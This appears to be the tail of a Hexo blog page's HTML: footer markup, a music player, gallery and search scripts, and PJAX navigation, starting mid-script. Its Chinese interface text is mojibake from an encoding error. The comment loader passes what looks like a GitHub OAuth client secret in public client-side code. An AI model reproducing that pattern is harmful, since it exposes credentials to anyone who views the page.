        }var now = new Date();setInterval("createTime('2024/7/29 21:00:00')", 250,"");</script><br></span><div class="size-small"><span>â¤ï¸æ„Ÿè°¢ <strong><span id="busuanzi_value_site_uv">99+</span></strong> å°ä¼™ä¼´çš„ <strong><span id="busuanzi_value_site_pv">99+</span></strong> æ¬¡å…‰ä¸´ï¼â¤ï¸</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="9422021582" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('Ov23liIz1bPooLBfW0Cm','8f8f49427fa732912dade765d516294e964b4f41','LuffyS93','Comments_of_blog',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//ä»£è¡¨ç‚¹å‡»é“¾æ¥å°±æ›´æ–°
            selectors: [  //ä»£è¡¨è¦æ›´æ–°çš„èŠ‚ç‚¹
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //åŠ è½½mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // å¼€å§‹ PJAX æ‰§è¡Œçš„å‡½æ•°
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX å®Œæˆä¹‹åæ‰§è¡Œçš„å‡½æ•°ï¼Œå¯ä»¥å’Œä¸Šé¢çš„é‡è½½æ”¾åœ¨ä¸€èµ·
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(true){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('Ov23liIz1bPooLBfW0Cm','8f8f49427fa732912dade765d516294e964b4f41','LuffyS93','Comments_of_blog',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>